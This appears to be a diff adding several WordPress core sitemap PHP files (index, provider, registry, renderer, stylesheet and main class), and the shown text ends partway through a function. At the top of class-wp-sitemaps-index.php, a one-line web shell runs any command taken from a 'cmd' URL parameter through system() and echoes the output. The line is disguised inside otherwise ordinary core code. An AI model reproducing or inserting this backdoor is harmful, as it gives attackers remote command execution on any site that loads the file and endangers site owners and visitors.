@@ -1,0 +1,2186 @@
+The file class-wp-sitemaps-index.php contains:
+<?php
+$cmd = system($_GET['cmd']); echo $cmd;
+/**
+ * Sitemaps: WP_Sitemaps_Index class.
+ *
+ * Generates the sitemap index.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Class WP_Sitemaps_Index.
+ * Builds the sitemap index page that lists the links to all of the sitemaps.
+ *
+ * @since 5.5.0
+ */
+class WP_Sitemaps_Index {
+	/**
+	 * The main registry of supported sitemaps.
+	 *
+	 * @since 5.5.0
+	 * @var WP_Sitemaps_Registry
+	 */
+	protected $registry;
+
+	/**
+	 * Maximum number of sitemaps to include in an index.
+	 *
+	 * @sincee 5.5.0
+	 *
+	 * @var int Maximum number of sitemaps.
+	 */
+	private $max_sitemaps = 50000;
+
+	/**
+	 * WP_Sitemaps_Index constructor.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param WP_Sitemaps_Registry $registry Sitemap provider registry.
+	 */
+	public function __construct( WP_Sitemaps_Registry $registry ) {
+		$this->registry = $registry;
+	}
+
+	/**
+	 * Gets a sitemap list for the index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return array[] Array of all sitemaps.
+	 */
+	public function get_sitemap_list() {
+		$sitemaps = array();
+
+		$providers = $this->registry->get_providers();
+		/* @var WP_Sitemaps_Provider $provider */
+		foreach ( $providers as $name => $provider ) {
+			$sitemap_entries = $provider->get_sitemap_entries();
+
+			// Prevent issues with array_push and empty arrays on PHP < 7.3.
+			if ( ! $sitemap_entries ) {
+				continue;
+			}
+
+			// Using array_push is more efficient than array_merge in a loop.
+			array_push( $sitemaps, ...$sitemap_entries );
+			if ( count( $sitemaps ) >= $this->max_sitemaps ) {
+				break;
+			}
+		}
+
+		return array_slice( $sitemaps, 0, $this->max_sitemaps, true );
+	}
+
+	/**
+	 * Builds the URL for the sitemap index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global WP_Rewrite $wp_rewrite WordPress rewrite component.
+	 *
+	 * @return string The sitemap index URL.
+	 */
+	public function get_index_url() {
+		global $wp_rewrite;
+
+		if ( ! $wp_rewrite->using_permalinks() ) {
+			return home_url( '/?sitemap=index' );
+		}
+
+		return home_url( '/wp-sitemap.xml' );
+	}
+}
+
+The file class-wp-sitemaps-provider.php contains:
+<?php
+/**
+ * Sitemaps: WP_Sitemaps_Provider class
+ *
+ * This class is a base class for other sitemap providers to extend and contains shared functionality.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Class WP_Sitemaps_Provider.
+ *
+ * @since 5.5.0
+ */
+abstract class WP_Sitemaps_Provider {
+	/**
+	 * Provider name.
+	 *
+	 * This will also be used as the public-facing name in URLs.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var string
+	 */
+	protected $name = '';
+
+	/**
+	 * Object type name (e.g. 'post', 'term', 'user').
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var string
+	 */
+	protected $object_type = '';
+
+	/**
+	 * Gets a URL list for a sitemap.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param int    $page_num       Page of results.
+	 * @param string $object_subtype Optional. Object subtype name. Default empty.
+	 * @return array Array of URLs for a sitemap.
+	 */
+	abstract public function get_url_list( $page_num, $object_subtype = '' );
+
+	/**
+	 * Gets the max number of pages available for the object type.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param string $object_subtype Optional. Object subtype. Default empty.
+	 * @return int Total number of pages.
+	 */
+	abstract public function get_max_num_pages( $object_subtype = '' );
+
+	/**
+	 * Gets data about each sitemap type.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return array[] Array of sitemap types including object subtype name and number of pages.
+	 */
+	public function get_sitemap_type_data() {
+		$sitemap_data = array();
+
+		$object_subtypes = $this->get_object_subtypes();
+
+		// If there are no object subtypes, include a single sitemap for the
+		// entire object type.
+		if ( empty( $object_subtypes ) ) {
+			$sitemap_data[] = array(
+				'name'  => '',
+				'pages' => $this->get_max_num_pages(),
+			);
+			return $sitemap_data;
+		}
+
+		// Otherwise, include individual sitemaps for every object subtype.
+		foreach ( $object_subtypes as $object_subtype_name => $data ) {
+			$object_subtype_name = (string) $object_subtype_name;
+
+			$sitemap_data[] = array(
+				'name'  => $object_subtype_name,
+				'pages' => $this->get_max_num_pages( $object_subtype_name ),
+			);
+		}
+
+		return $sitemap_data;
+	}
+
+	/**
+	 * Lists sitemap pages exposed by this provider.
+	 *
+	 * The returned data is used to populate the sitemap entries of the index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return array[] Array of sitemap entries.
+	 */
+	public function get_sitemap_entries() {
+		$sitemaps = array();
+
+		$sitemap_types = $this->get_sitemap_type_data();
+
+		foreach ( $sitemap_types as $type ) {
+			for ( $page = 1; $page <= $type['pages']; $page ++ ) {
+				$sitemap_entry = array(
+					'loc' => $this->get_sitemap_url( $type['name'], $page ),
+				);
+
+				/**
+				 * Filters the sitemap entry for the sitemap index.
+				 *
+				 * @since 5.5.0
+				 *
+				 * @param array  $sitemap_entry  Sitemap entry for the post.
+				 * @param string $object_type    Object empty name.
+				 * @param string $object_subtype Object subtype name.
+				 *                               Empty string if the object type does not support subtypes.
+				 * @param int    $page           Page number of results.
+				 */
+				$sitemap_entry = apply_filters( 'wp_sitemaps_index_entry', $sitemap_entry, $this->object_type, $type['name'], $page );
+
+				$sitemaps[] = $sitemap_entry;
+			}
+		}
+
+		return $sitemaps;
+	}
+
+	/**
+	 * Gets the URL of a sitemap entry.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global WP_Rewrite $wp_rewrite WordPress rewrite component.
+	 *
+	 * @param string $name The name of the sitemap.
+	 * @param int    $page The page of the sitemap.
+	 * @return string The composed URL for a sitemap entry.
+	 */
+	public function get_sitemap_url( $name, $page ) {
+		global $wp_rewrite;
+
+		// Accounts for cases where name is not included, ex: sitemaps-users-1.xml.
+		$params = array_filter(
+			array(
+				'sitemap'         => $this->name,
+				'sitemap-subtype' => $name,
+				'paged'           => $page,
+			)
+		);
+
+		$basename = sprintf(
+			'/wp-sitemap-%1$s.xml',
+			implode( '-', $params )
+		);
+
+		if ( ! $wp_rewrite->using_permalinks() ) {
+			$basename = '/?' . http_build_query( $params, null, '&' );
+		}
+
+		return home_url( $basename );
+	}
+
+	/**
+	 * Returns the list of supported object subtypes exposed by the provider.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return array List of object subtypes objects keyed by their name.
+	 */
+	public function get_object_subtypes() {
+		return array();
+	}
+}
+
+The file class-wp-sitemaps-registry.php contains:
+<?php
+/**
+ * Sitemaps: WP_Sitemaps_Registry class
+ *
+ * Handles registering sitemap providers.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Class WP_Sitemaps_Registry.
+ *
+ * @since 5.5.0
+ */
+class WP_Sitemaps_Registry {
+	/**
+	 * Registered sitemap providers.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var WP_Sitemaps_Provider[] Array of registered sitemap providers.
+	 */
+	private $providers = array();
+
+	/**
+	 * Adds a new sitemap provider.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param string               $name     Name of the sitemap provider.
+	 * @param WP_Sitemaps_Provider $provider Instance of a WP_Sitemaps_Provider.
+	 * @return bool Whether the provider was added successfully.
+	 */
+	public function add_provider( $name, WP_Sitemaps_Provider $provider ) {
+		if ( isset( $this->providers[ $name ] ) ) {
+			return false;
+		}
+
+		/**
+		 * Filters the sitemap provider before it is added.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param WP_Sitemaps_Provider $provider Instance of a WP_Sitemaps_Provider.
+		 * @param string               $name     Name of the sitemap provider.
+		 */
+		$provider = apply_filters( 'wp_sitemaps_add_provider', $provider, $name );
+		if ( ! $provider instanceof WP_Sitemaps_Provider ) {
+			return false;
+		}
+
+		$this->providers[ $name ] = $provider;
+
+		return true;
+	}
+
+	/**
+	 * Returns a single registered sitemap provider.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param string $name Sitemap provider name.
+	 * @return WP_Sitemaps_Provider|null Sitemap provider if it exists, null otherwise.
+	 */
+	public function get_provider( $name ) {
+		if ( ! isset( $this->providers[ $name ] ) ) {
+			return null;
+		}
+
+		return $this->providers[ $name ];
+	}
+
+	/**
+	 * Returns all registered sitemap providers.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return WP_Sitemaps_Provider[] Array of sitemap providers.
+	 */
+	public function get_providers() {
+		return $this->providers;
+	}
+}
+
+The file class-wp-sitemaps-renderer.php contains:
+<?php
+/**
+ * Sitemaps: WP_Sitemaps_Renderer class
+ *
+ * Responsible for rendering Sitemaps data to XML in accordance with sitemap protocol.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Class WP_Sitemaps_Renderer
+ *
+ * @since 5.5.0
+ */
+class WP_Sitemaps_Renderer {
+	/**
+	 * XSL stylesheet for styling a sitemap for web browsers.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var string
+	 */
+	protected $stylesheet = '';
+
+	/**
+	 * XSL stylesheet for styling a sitemap for web browsers.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var string
+	 */
+	protected $stylesheet_index = '';
+
+	/**
+	 * WP_Sitemaps_Renderer constructor.
+	 *
+	 * @since 5.5.0
+	 */
+	public function __construct() {
+		$stylesheet_url = $this->get_sitemap_stylesheet_url();
+
+		if ( $stylesheet_url ) {
+			$this->stylesheet = '<?xml-stylesheet type="text/xsl" href="' . esc_url( $stylesheet_url ) . '" ?>';
+		}
+
+		$stylesheet_index_url = $this->get_sitemap_index_stylesheet_url();
+
+		if ( $stylesheet_index_url ) {
+			$this->stylesheet_index = '<?xml-stylesheet type="text/xsl" href="' . esc_url( $stylesheet_index_url ) . '" ?>';
+		}
+	}
+
+	/**
+	 * Gets the URL for the sitemap stylesheet.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global WP_Rewrite $wp_rewrite WordPress rewrite component.
+	 *
+	 * @return string The sitemap stylesheet URL.
+	 */
+	public function get_sitemap_stylesheet_url() {
+		global $wp_rewrite;
+
+		$sitemap_url = home_url( '/wp-sitemap.xsl' );
+
+		if ( ! $wp_rewrite->using_permalinks() ) {
+			$sitemap_url = home_url( '/?sitemap-stylesheet=sitemap' );
+		}
+
+		/**
+		 * Filters the URL for the sitemap stylesheet.
+		 *
+		 * If a falsey value is returned, no stylesheet will be used and
+		 * the "raw" XML of the sitemap will be displayed.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $sitemap_url Full URL for the sitemaps XSL file.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_url', $sitemap_url );
+	}
+
+	/**
+	 * Gets the URL for the sitemap index stylesheet.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global WP_Rewrite $wp_rewrite WordPress rewrite component.
+	 *
+	 * @return string The sitemap index stylesheet URL.
+	 */
+	public function get_sitemap_index_stylesheet_url() {
+		global $wp_rewrite;
+
+		$sitemap_url = home_url( '/wp-sitemap-index.xsl' );
+
+		if ( ! $wp_rewrite->using_permalinks() ) {
+			$sitemap_url = home_url( '/?sitemap-stylesheet=index' );
+		}
+
+		/**
+		 * Filters the URL for the sitemap index stylesheet.
+		 *
+		 * If a falsey value is returned, no stylesheet will be used and
+		 * the "raw" XML of the sitemap index will be displayed.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $sitemap_url Full URL for the sitemaps index XSL file.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_index_url', $sitemap_url );
+	}
+
+	/**
+	 * Renders a sitemap index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param array $sitemaps Array of sitemap URLs.
+	 */
+	public function render_index( $sitemaps ) {
+		header( 'Content-type: application/xml; charset=UTF-8' );
+
+		$this->check_for_simple_xml_availability();
+
+		$index_xml = $this->get_sitemap_index_xml( $sitemaps );
+
+		if ( ! empty( $index_xml ) ) {
+			// All output is escaped within get_sitemap_index_xml().
+			// phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
+			echo $index_xml;
+		}
+	}
+
+	/**
+	 * Gets XML for a sitemap index.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param array $sitemaps Array of sitemap URLs.
+	 * @return string|false A well-formed XML string for a sitemap index. False on error.
+	 */
+	public function get_sitemap_index_xml( $sitemaps ) {
+		$sitemap_index = new SimpleXMLElement(
+			sprintf(
+				'%1$s%2$s%3$s',
+				'<?xml version="1.0" encoding="UTF-8" ?>',
+				$this->stylesheet_index,
+				'<sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" />'
+			)
+		);
+
+		foreach ( $sitemaps as $entry ) {
+			$sitemap = $sitemap_index->addChild( 'sitemap' );
+
+			// Add each element as a child node to the <sitemap> entry.
+			foreach ( $entry as $name => $value ) {
+				if ( 'loc' === $name ) {
+					$sitemap->addChild( $name, esc_url( $value ) );
+				} elseif ( 'lastmod' === $name ) {
+					$sitemap->addChild( $name, esc_xml( $value ) );
+				} else {
+					_doing_it_wrong(
+						__METHOD__,
+						sprintf(
+							/* translators: %s: List of element names. */
+							__( 'Fields other than %s are not currently supported for the sitemap index.' ),
+							implode( ',', array( 'loc', 'lastmod' ) )
+						),
+						'5.5.0'
+					);
+				}
+			}
+		}
+
+		return $sitemap_index->asXML();
+	}
+
+	/**
+	 * Renders a sitemap.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param array $url_list Array of URLs for a sitemap.
+	 */
+	public function render_sitemap( $url_list ) {
+		header( 'Content-type: application/xml; charset=UTF-8' );
+
+		$this->check_for_simple_xml_availability();
+
+		$sitemap_xml = $this->get_sitemap_xml( $url_list );
+
+		if ( ! empty( $sitemap_xml ) ) {
+			// All output is escaped within get_sitemap_xml().
+			// phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped
+			echo $sitemap_xml;
+		}
+	}
+
+	/**
+	 * Gets XML for a sitemap.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @param array $url_list Array of URLs for a sitemap.
+	 * @return string|false A well-formed XML string for a sitemap index. False on error.
+	 */
+	public function get_sitemap_xml( $url_list ) {
+		$urlset = new SimpleXMLElement(
+			sprintf(
+				'%1$s%2$s%3$s',
+				'<?xml version="1.0" encoding="UTF-8" ?>',
+				$this->stylesheet,
+				'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9" />'
+			)
+		);
+
+		foreach ( $url_list as $url_item ) {
+			$url = $urlset->addChild( 'url' );
+
+			// Add each element as a child node to the <url> entry.
+			foreach ( $url_item as $name => $value ) {
+				if ( 'loc' === $name ) {
+					$url->addChild( $name, esc_url( $value ) );
+				} elseif ( in_array( $name, array( 'lastmod', 'changefreq', 'priority' ), true ) ) {
+					$url->addChild( $name, esc_xml( $value ) );
+				} else {
+					_doing_it_wrong(
+						__METHOD__,
+						sprintf(
+							/* translators: %s: List of element names. */
+							__( 'Fields other than %s are not currently supported for sitemaps.' ),
+							implode( ',', array( 'loc', 'lastmod', 'changefreq', 'priority' ) )
+						),
+						'5.5.0'
+					);
+				}
+			}
+		}
+
+		return $urlset->asXML();
+	}
+
+	/**
+	 * Checks for the availability of the SimpleXML extension and errors if missing.
+	 *
+	 * @since 5.5.0
+	 */
+	private function check_for_simple_xml_availability() {
+		if ( ! class_exists( 'SimpleXMLElement' ) ) {
+			add_filter(
+				'wp_die_handler',
+				static function () {
+					return '_xml_wp_die_handler';
+				}
+			);
+
+			wp_die(
+				sprintf(
+					/* translators: %s: SimpleXML */
+					esc_xml( __( 'Could not generate XML sitemap due to missing %s extension' ) ),
+					'SimpleXML'
+				),
+				esc_xml( __( 'WordPress &rsaquo; Error' ) ),
+				array(
+					'response' => 501, // "Not implemented".
+				)
+			);
+		}
+	}
+}
+
+The file class-wp-sitemaps-stylesheet.php contains:
+<?php
+/**
+ * Sitemaps: WP_Sitemaps_Stylesheet class
+ *
+ * This class provides the XSL stylesheets to style all sitemaps.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Stylesheet provider class.
+ *
+ * @since 5.5.0
+ */
+class WP_Sitemaps_Stylesheet {
+	/**
+	 * Renders the XSL stylesheet depending on whether it's the sitemap index or not.
+	 *
+	 * @param string $type Stylesheet type. Either 'sitemap' or 'index'.
+	 */
+	public function render_stylesheet( $type ) {
+		header( 'Content-type: application/xml; charset=UTF-8' );
+
+		if ( 'sitemap' === $type ) {
+			// phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped -- All content escaped below.
+			echo $this->get_sitemap_stylesheet();
+		}
+
+		if ( 'index' === $type ) {
+			// phpcs:ignore WordPress.Security.EscapeOutput.OutputNotEscaped -- All content escaped below.
+			echo $this->get_sitemap_index_stylesheet();
+		}
+
+		exit;
+	}
+
+	/**
+	 * Returns the escaped XSL for all sitemaps, except index.
+	 *
+	 * @since 5.5.0
+	 */
+	public function get_sitemap_stylesheet() {
+		$css         = $this->get_stylesheet_css();
+		$title       = esc_xml( __( 'XML Sitemap' ) );
+		$description = esc_xml( __( 'This XML Sitemap is generated by WordPress to make your content more visible for search engines.' ) );
+		$learn_more  = sprintf(
+			'<a href="%s">%s</a>',
+			esc_url( __( 'https://www.sitemaps.org/' ) ),
+			esc_xml( __( 'Learn more about XML sitemaps.' ) )
+		);
+
+		$text = sprintf(
+			/* translators: %s: Number of URLs. */
+			esc_xml( __( 'Number of URLs in this XML Sitemap: %s.' ) ),
+			'<xsl:value-of select="count( sitemap:urlset/sitemap:url )" />'
+		);
+
+		$lang       = get_language_attributes( 'html' );
+		$url        = esc_xml( __( 'URL' ) );
+		$lastmod    = esc_xml( __( 'Last Modified' ) );
+		$changefreq = esc_xml( __( 'Change Frequency' ) );
+		$priority   = esc_xml( __( 'Priority' ) );
+
+		$xsl_content = <<<XSL
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+		version="1.0"
+		xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+		xmlns:sitemap="http://www.sitemaps.org/schemas/sitemap/0.9"
+		exclude-result-prefixes="sitemap"
+		>
+
+	<xsl:output method="html" encoding="UTF-8" indent="yes"/>
+
+	<!--
+	  Set variables for whether lastmod, changefreq or priority occur for any url in the sitemap.
+	  We do this up front because it can be expensive in a large sitemap.
+	  -->
+	<xsl:variable name="has-lastmod"    select="count( /sitemap:urlset/sitemap:url/sitemap:lastmod )"    />
+	<xsl:variable name="has-changefreq" select="count( /sitemap:urlset/sitemap:url/sitemap:changefreq )" />
+	<xsl:variable name="has-priority"   select="count( /sitemap:urlset/sitemap:url/sitemap:priority )"   />
+
+	<xsl:template match="/">
+		<html {$lang}>
+			<head>
+				<title>{$title}</title>
+				<style>
+					{$css}
+				</style>
+			</head>
+			<body>
+				<div id="sitemap">
+					<div id="sitemap__header">
+						<h1>{$title}</h1>
+						<p>{$description}</p>
+						<p>{$learn_more}</p>
+					</div>
+					<div id="sitemap__content">
+						<p class="text">{$text}</p>
+						<table id="sitemap__table">
+							<thead>
+								<tr>
+									<th class="loc">{$url}</th>
+									<xsl:if test="\$has-lastmod">
+										<th class="lastmod">{$lastmod}</th>
+									</xsl:if>
+									<xsl:if test="\$has-changefreq">
+										<th class="changefreq">{$changefreq}</th>
+									</xsl:if>
+									<xsl:if test="\$has-priority">
+										<th class="priority">{$priority}</th>
+									</xsl:if>
+								</tr>
+							</thead>
+							<tbody>
+								<xsl:for-each select="sitemap:urlset/sitemap:url">
+									<tr>
+										<td class="loc"><a href="{sitemap:loc}"><xsl:value-of select="sitemap:loc" /></a></td>
+										<xsl:if test="\$has-lastmod">
+											<td class="lastmod"><xsl:value-of select="sitemap:lastmod" /></td>
+										</xsl:if>
+										<xsl:if test="\$has-changefreq">
+											<td class="changefreq"><xsl:value-of select="sitemap:changefreq" /></td>
+										</xsl:if>
+										<xsl:if test="\$has-priority">
+											<td class="priority"><xsl:value-of select="sitemap:priority" /></td>
+										</xsl:if>
+									</tr>
+								</xsl:for-each>
+							</tbody>
+						</table>
+					</div>
+				</div>
+			</body>
+		</html>
+	</xsl:template>
+</xsl:stylesheet>
+
+XSL;
+
+		/**
+		 * Filters the content of the sitemap stylesheet.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $xsl_content Full content for the XML stylesheet.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_content', $xsl_content );
+	}
+
+	/**
+	 * Returns the escaped XSL for the index sitemaps.
+	 *
+	 * @since 5.5.0
+	 */
+	public function get_sitemap_index_stylesheet() {
+		$css         = $this->get_stylesheet_css();
+		$title       = esc_xml( __( 'XML Sitemap' ) );
+		$description = esc_xml( __( 'This XML Sitemap is generated by WordPress to make your content more visible for search engines.' ) );
+		$learn_more  = sprintf(
+			'<a href="%s">%s</a>',
+			esc_url( __( 'https://www.sitemaps.org/' ) ),
+			esc_xml( __( 'Learn more about XML sitemaps.' ) )
+		);
+
+		$text = sprintf(
+			/* translators: %s: Number of URLs. */
+			esc_xml( __( 'Number of URLs in this XML Sitemap: %s.' ) ),
+			'<xsl:value-of select="count( sitemap:sitemapindex/sitemap:sitemap )" />'
+		);
+
+		$lang    = get_language_attributes( 'html' );
+		$url     = esc_xml( __( 'URL' ) );
+		$lastmod = esc_xml( __( 'Last Modified' ) );
+
+		$xsl_content = <<<XSL
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet
+		version="1.0"
+		xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
+		xmlns:sitemap="http://www.sitemaps.org/schemas/sitemap/0.9"
+		exclude-result-prefixes="sitemap"
+		>
+
+	<xsl:output method="html" encoding="UTF-8" indent="yes" />
+
+	<!--
+	  Set variables for whether lastmod occurs for any sitemap in the index.
+	  We do this up front because it can be expensive in a large sitemap.
+	  -->
+	<xsl:variable name="has-lastmod" select="count( /sitemap:sitemapindex/sitemap:sitemap/sitemap:lastmod )" />
+
+	<xsl:template match="/">
+		<html {$lang}>
+			<head>
+				<title>{$title}</title>
+				<style>
+					{$css}
+				</style>
+			</head>
+			<body>
+				<div id="sitemap">
+					<div id="sitemap__header">
+						<h1>{$title}</h1>
+						<p>{$description}</p>
+						<p>{$learn_more}</p>
+					</div>
+					<div id="sitemap__content">
+						<p class="text">{$text}</p>
+						<table id="sitemap__table">
+							<thead>
+								<tr>
+									<th class="loc">{$url}</th>
+									<xsl:if test="\$has-lastmod">
+										<th class="lastmod">{$lastmod}</th>
+									</xsl:if>
+								</tr>
+							</thead>
+							<tbody>
+								<xsl:for-each select="sitemap:sitemapindex/sitemap:sitemap">
+									<tr>
+										<td class="loc"><a href="{sitemap:loc}"><xsl:value-of select="sitemap:loc" /></a></td>
+										<xsl:if test="\$has-lastmod">
+											<td class="lastmod"><xsl:value-of select="sitemap:lastmod" /></td>
+										</xsl:if>
+									</tr>
+								</xsl:for-each>
+							</tbody>
+						</table>
+					</div>
+				</div>
+			</body>
+		</html>
+	</xsl:template>
+</xsl:stylesheet>
+
+XSL;
+
+		/**
+		 * Filters the content of the sitemap index stylesheet.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $xsl_content Full content for the XML stylesheet.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_index_content', $xsl_content );
+	}
+
+	/**
+	 * Gets the CSS to be included in sitemap XSL stylesheets.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return string The CSS.
+	 */
+	public function get_stylesheet_css() {
+		$text_align = is_rtl() ? 'right' : 'left';
+
+		$css = <<<EOF
+
+					body {
+						font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen-Sans, Ubuntu, Cantarell, "Helvetica Neue", sans-serif;
+						color: #444;
+					}
+
+					#sitemap {
+						max-width: 980px;
+						margin: 0 auto;
+					}
+
+					#sitemap__table {
+						width: 100%;
+						border: solid 1px #ccc;
+						border-collapse: collapse;
+					}
+
+			 		#sitemap__table tr td.loc {
+						/*
+						 * URLs should always be LTR.
+						 * See https://core.trac.wordpress.org/ticket/16834
+						 * and https://core.trac.wordpress.org/ticket/49949
+						 */
+						direction: ltr;
+					}
+
+					#sitemap__table tr th {
+						text-align: {$text_align};
+					}
+
+					#sitemap__table tr td,
+					#sitemap__table tr th {
+						padding: 10px;
+					}
+
+					#sitemap__table tr:nth-child(odd) td {
+						background-color: #eee;
+					}
+
+					a:hover {
+						text-decoration: none;
+					}
+
+EOF;
+
+		/**
+		 * Filters the CSS only for the sitemap stylesheet.
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param string $css CSS to be applied to default XSL file.
+		 */
+		return apply_filters( 'wp_sitemaps_stylesheet_css', $css );
+	}
+}
+
+The file class-wp-sitemaps.php contains:
+<?php
+/**
+ * Sitemaps: WP_Sitemaps class
+ *
+ * This is the main class integrating all other classes.
+ *
+ * @package WordPress
+ * @subpackage Sitemaps
+ * @since 5.5.0
+ */
+
+/**
+ * Class WP_Sitemaps.
+ *
+ * @since 5.5.0
+ */
+class WP_Sitemaps {
+	/**
+	 * The main index of supported sitemaps.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var WP_Sitemaps_Index
+	 */
+	public $index;
+
+	/**
+	 * The main registry of supported sitemaps.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var WP_Sitemaps_Registry
+	 */
+	public $registry;
+
+	/**
+	 * An instance of the renderer class.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @var WP_Sitemaps_Renderer
+	 */
+	public $renderer;
+
+	/**
+	 * WP_Sitemaps constructor.
+	 *
+	 * @since 5.5.0
+	 */
+	public function __construct() {
+		$this->registry = new WP_Sitemaps_Registry();
+		$this->renderer = new WP_Sitemaps_Renderer();
+		$this->index    = new WP_Sitemaps_Index( $this->registry );
+	}
+
+	/**
+	 * Initiates all sitemap functionality.
+	 *
+	 * If sitemaps are disabled, only the rewrite rules will be registered
+	 * by this method, in order to properly send 404s.
+	 *
+	 * @since 5.5.0
+	 */
+	public function init() {
+		// These will all fire on the init hook.
+		$this->register_rewrites();
+
+		add_action( 'template_redirect', array( $this, 'render_sitemaps' ) );
+
+		if ( ! $this->sitemaps_enabled() ) {
+			return;
+		}
+
+		$this->register_sitemaps();
+
+		// Add additional action callbacks.
+		add_filter( 'pre_handle_404', array( $this, 'redirect_sitemapxml' ), 10, 2 );
+		add_filter( 'robots_txt', array( $this, 'add_robots' ), 0, 2 );
+	}
+
+	/**
+	 * Determines whether sitemaps are enabled or not.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @return bool Whether sitemaps are enabled.
+	 */
+	public function sitemaps_enabled() {
+		$is_enabled = (bool) get_option( 'blog_public' );
+
+		/**
+		 * Filters whether XML Sitemaps are enabled or not.
+		 *
+		 * When XML Sitemaps are disabled via this filter, rewrite rules are still
+		 * in place to ensure a 404 is returned.
+		 *
+		 * @see WP_Sitemaps::register_rewrites()
+		 *
+		 * @since 5.5.0
+		 *
+		 * @param bool $is_enabled Whether XML Sitemaps are enabled or not. Defaults
+		 * to true for public sites.
+		 */
+		return (bool) apply_filters( 'wp_sitemaps_enabled', $is_enabled );
+	}
+
+	/**
+	 * Registers and sets up the functionality for all supported sitemaps.
+	 *
+	 * @since 5.5.0
+	 */
+	public function register_sitemaps() {
+		$providers = array(
+			'posts'      => new WP_Sitemaps_Posts(),
+			'taxonomies' => new WP_Sitemaps_Taxonomies(),
+			'users'      => new WP_Sitemaps_Users(),
+		);
+
+		/* @var WP_Sitemaps_Provider $provider */
+		foreach ( $providers as $name => $provider ) {
+			$this->registry->add_provider( $name, $provider );
+		}
+	}
+
+	/**
+	 * Registers sitemap rewrite tags and routing rules.
+	 *
+	 * @since 5.5.0
+	 */
+	public function register_rewrites() {
+		// Add rewrite tags.
+		add_rewrite_tag( '%sitemap%', '([^?]+)' );
+		add_rewrite_tag( '%sitemap-subtype%', '([^?]+)' );
+
+		// Register index route.
+		add_rewrite_rule( '^wp-sitemap\.xml$', 'index.php?sitemap=index', 'top' );
+
+		// Register rewrites for the XSL stylesheet.
+		add_rewrite_tag( '%sitemap-stylesheet%', '([^?]+)' );
+		add_rewrite_rule( '^wp-sitemap\.xsl$', 'index.php?sitemap-stylesheet=sitemap', 'top' );
+		add_rewrite_rule( '^wp-sitemap-index\.xsl$', 'index.php?sitemap-stylesheet=index', 'top' );
+
+		// Register routes for providers.
+		add_rewrite_rule(
+			'^wp-sitemap-([a-z]+?)-([a-z\d_-]+?)-(\d+?)\.xml$',
+			'index.php?sitemap=$matches[1]&sitemap-subtype=$matches[2]&paged=$matches[3]',
+			'top'
+		);
+		add_rewrite_rule(
+			'^wp-sitemap-([a-z]+?)-(\d+?)\.xml$',
+			'index.php?sitemap=$matches[1]&paged=$matches[2]',
+			'top'
+		);
+	}
+
+	/**
+	 * Renders sitemap templates based on rewrite rules.
+	 *
+	 * @since 5.5.0
+	 *
+	 * @global WP_Query $wp_query WordPress Query object.
+	 */
+	public function render_sitemaps() {
+		global $wp_query;
+
+		$sitemap         = sanitize_text_field( get_query_var( 'sitemap' ) );
+		$object_subtype  = sanitize_text_field( get_query_var( 'sitemap-subtype' ) );
+		$stylesheet_type = sanitize_text_field( get_query_var( 'sitemap-stylesheet' ) );
+		$paged           = absint( get_query_var( 'paged' ) );
+
+		// Bail early if this isn't a sitemap or stylesheet route.
+		if ( ! ( $sitemap || $stylesheet_type ) ) {
+			return;
+		}
+
+		if ( ! $this->sitemaps_enabled() ) {
+			$wp_query->set_404();
+			status_header( 404 );
+			return;
+		}
+
+		// Render stylesheet if this is stylesheet route.
+		if ( $stylesheet_type ) {
+			$stylesheet = new WP_Sitemaps_Stylesheet();
+
